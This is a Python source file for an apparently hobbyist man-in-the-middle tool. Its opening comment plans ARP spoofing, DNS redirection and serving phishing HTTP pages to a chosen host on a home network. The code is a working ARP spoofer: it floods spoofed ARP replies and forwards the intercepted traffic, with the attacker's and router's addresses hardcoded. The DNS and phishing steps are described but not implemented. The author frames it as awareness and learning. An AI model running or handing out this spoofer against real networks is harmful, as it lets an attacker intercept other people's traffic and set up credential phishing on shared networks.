'''
    This project aims to create a local network MitM attack to send phishing http websites to hosts. While this seems a pretty evil thing to do, the only goal is to alert people of the problem using http. Besides that, it can be used to learning purposes for me. I have never done something like this from scratch and I'm coding this only based on my current knowledge of how this protocol stack works.
    How it is going to work:
        1- I need to spoof the arp address of my home router so I can act like the Man in the Middle
        2- I need to target a specif IP on my network that I want to fool around
        3- I need to check for all DNS requests from this IP that matches to a specific domain and map to my local network ip
        4- I need to setup a http server that is going to listen for connections and return whatever I want
'''

import time
import threading
from ethernetii import *
from arp import *
from ipv4 import *


class ARPSpooferController():
    def __init__(self, sourceIP, routerIP, interfaceName, networkAddress):
        self.NetworkAddress = networkAddress
        self.SourceIP = sourceIP
        self.Ethernet = EthernetII(interfaceName)
        self.ARP = AddressResolutionProtocol(self.Ethernet)
        self.RouterIP = routerIP
        self.RouterMAC = self.ARP.GetTargetMAC(b'\x08\x00', sourceIP, routerIP)
        self.MACList = {self.RouterIP: self.RouterMAC}

    def SpoofIPList(self):
        def SpoofLoop():
            while True:
                for ip, mac in self.MACList.copy().items():
                    print('spoofing: ' + '.'.join([str(int(byte)) for byte in ip]))
                    self.ARP.SpoofTargetMAC(b'\x08\x00', ip, b'\xff\xff\xff\xff\xff\xff', ip)
                    time.sleep(1)
        return threading.Thread(target = SpoofLoop)

    def SpoofedPacketsForwarder(self):
        def ForwarderLoop():
            while True:
                packet = self.Ethernet.ReceiveFrame(b'\x08\x00')
                ipv4 = InternetProtocol4(packet[3])
                src = '.'.join([str(int(byte)) for byte in ipv4.SourceAddress])
                dst = '.'.join([str(int(byte)) for byte in ipv4.DestinationAddress])
                print('datagram from {} to {}'.format(src, dst))
                sourceMAC = self.Ethernet.GetInterfaceMAC()
                try:
                    if self.NetworkAddress in src:
                        self.MACList[ipv4.SourceAddress] = packet[1]
                    if self.NetworkAddress in dst:
                        if ipv4.DestinationAddress in self.MACList:
                            destinationMAC = self.MACList[ipv4.DestinationAddress]
                        else:
                            destinationMAC = self.ARP.GetTargetMAC(b'\x08\x00', self.SourceIP, ipv4.DestinationAddress)
                            self.MACList[ipv4.DestinationAddress] = destinationMAC
                        self.Ethernet.SendFrame(destinationMAC, packet[0], packet[2], packet[3])
                    else:
                        self.Ethernet.SendFrame(self.RouterMAC, packet[0], packet[2], packet[3])
                except:
                    print('packet lost')
        return threading.Thread(target = ForwarderLoop)

controller = ARPSpooferController(b'\xc0\xa8\x00\x06', b'\xc0\xa8\x00\x01', 'wlan0', '192.168.0')
networkSpoofer = controller.SpoofIPList()
forwarder = controller.SpoofedPacketsForwarder()

forwarder.start()
networkSpoofer.start()
forwarder.join()
networkSpoofer.join()

'''(hwType, pType, haLength, paLength, operation, senderHA, senderPA, targetHA, targetPA)'''
